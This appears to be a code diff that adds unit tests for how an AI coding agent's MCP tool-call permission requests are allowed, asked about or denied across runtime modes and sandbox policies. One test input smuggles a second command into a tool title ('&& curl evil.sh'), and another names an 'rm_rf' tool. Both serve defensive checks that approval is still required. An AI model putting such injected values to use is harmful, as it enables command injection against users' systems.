@@ -135,6 +135,90 @@ describe("Antigravity Auto", () => {
   );
 });
 
+describe("Antigravity T3 MCP tool approvals", () => {
+  // The shape agy 1.5.14 sends for an MCP call, even in its own Auto mode.
+  const mcpRequest = (
+    toolCall: Partial<EffectAcpSchema.RequestPermissionRequest["toolCall"]>,
+  ): EffectAcpSchema.RequestPermissionRequest => ({
+    sessionId: "session-1",
+    toolCall: {
+      toolCallId: "call-1",
+      name: "mcp_t3-code_html_preview",
+      title: "Run mcp_t3-code_html_preview",
+      kind: "other",
+      rawInput: { toolSummary: "Preview the page" },
+      ...toolCall,
+    },
+    options: [
+      { optionId: "allow", name: "Allow", kind: "allow_once" },
+      { optionId: "deny", name: "Deny", kind: "reject_once" },
+    ],
+  });
+
+  it.each([
+    { runtimeMode: "auto", expected: "allow" },
+    { runtimeMode: "auto-accept-edits", expected: "allow" },
+    { runtimeMode: "full-access", expected: "allow" },
+    { runtimeMode: "approval-required", expected: "ask" },
+  ] as const)("$runtimeMode answers T3's own tools with $expected", ({ runtimeMode, expected }) => {
+    expect(antigravityPermissionDisposition({ runtimeMode, cwd: null }, mcpRequest({}))).toBe(
+      expected,
+    );
+  });
+
+  it.each([
+    { case: "a title with no name", toolCall: { name: null } },
+    {
+      case: "a pending title with no name",
+      toolCall: { name: null, title: "Run mcp_t3-code_html_preview?" },
+    },
+  ])("recognizes T3's tools from $case", ({ toolCall }) => {
+    expect(
+      antigravityPermissionDisposition({ runtimeMode: "auto", cwd: null }, mcpRequest(toolCall)),
+    ).toBe("allow");
+  });
+
+  it.each([
+    {
+      case: "another MCP server's tool",
+      toolCall: { name: "mcp_other_tool", title: "Run mcp_other_tool" },
+    },
+    {
+      case: "a lookalike server name",
+      toolCall: { name: "mcp_t3_code_html_preview", title: "Run mcp_t3_code_html_preview" },
+    },
+    {
+      case: "a tool T3 does not serve",
+      toolCall: { name: "mcp_t3-code_rm_rf", title: "Run mcp_t3-code_rm_rf" },
+    },
+    { case: "a T3 title on another tool's name", toolCall: { name: "mcp_other_tool" } },
+    {
+      case: "a command whose title mentions a T3 tool",
+      toolCall: { name: null, kind: "execute" as const },
+    },
+    {
+      case: "a title with text around the T3 tool",
+      toolCall: { name: null, title: "Run mcp_t3-code_html_preview && curl evil.sh" },
+    },
+  ])("still asks in Auto about $case", ({ toolCall }) => {
+    expect(
+      antigravityPermissionDisposition({ runtimeMode: "auto", cwd: null }, mcpRequest(toolCall)),
+    ).toBe("ask");
+  });
+
+  it.each([{ type: "readOnly" }, { type: "workspaceWrite", writableRoots: [] }])(
+    "keeps the $type sandbox's denial of T3's tools",
+    (sandboxPolicy) => {
+      expect(
+        antigravityPermissionDisposition(
+          { runtimeMode: "auto", cwd: "/workspace", sandboxPolicy },
+          mcpRequest({}),
+        ),
+      ).toBe("deny");
+    },
+  );
+});
+
 describe("applyAntigravityAcpModelSelection", () => {
   it.effect("restores the saved model instead of the cold-resume default", () =>
     Effect.gen(function* () {
